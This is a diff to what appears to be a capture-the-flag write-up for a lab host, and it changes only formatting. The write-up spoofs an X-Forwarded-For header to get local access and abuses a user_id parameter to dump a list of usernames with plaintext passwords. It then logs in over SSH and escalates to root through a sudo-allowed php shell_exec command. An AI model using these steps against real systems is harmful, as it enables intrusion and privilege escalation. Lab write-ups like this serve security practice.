@@ -20,29 +20,29 @@
 ## Penetration:
 - index.php req local access
 - header capture/info with **Fiddler**
-- custom header with browser extension(X-Forwarded-For: 0.0.0.0)
+- custom header with browser extension(`X-Forwarded-For: 0.0.0.0`)
 - local access granted 
 - register: http://192.168.1.13/index.php?page=register
 - login: http://192.168.1.13/index.php?page=login
 - profile : http://192.168.1.13/index.php?page=profile&user_id=13
-- form action="#" -> POSTS data on index.php?page=profile
+- `form action="#"` -> POSTS data on index.php?page=profile
 - user_id allows to get all the name,uname,pass values 
 - uname:pass list
-	1.eweuhtandingan:skuyatuh
-	2.aingmaung:qwerty!!!
-	3.sundatea:indONEsia
-	4.sedihaingmah:cedihhihihi
-   -->  5.alice:4lic3
-	6.abdikasepak:dorrrrr
+	1.eweuhtandingan:skuyatuh  
+	2.aingmaung:qwerty!!!  
+	3.sundatea:indONEsia  
+	4.sedihaingmah:cedihhihihi  
+   	**5.alice:4lic3**  <-------------------------------     
+	6.abdikasepak:dorrrrr  
 - `ssh 192.168.1.13 -l alice`
-- login in and capture *first flag*
+- login in and capture **first flag**
 			
 ## Privilege Escelation:
 - `sudo -l`:
 	* alice has root access on /usr/bin/php
 - `sudo php -r 'shell_exec("sudo /bin/bash -i 1>&0");'`
 - root access granted
-- `cd /root && cat flag*` and capture the *second flag*
+- `cd /root && cat flag*` and capture the **second flag**
 
 
 
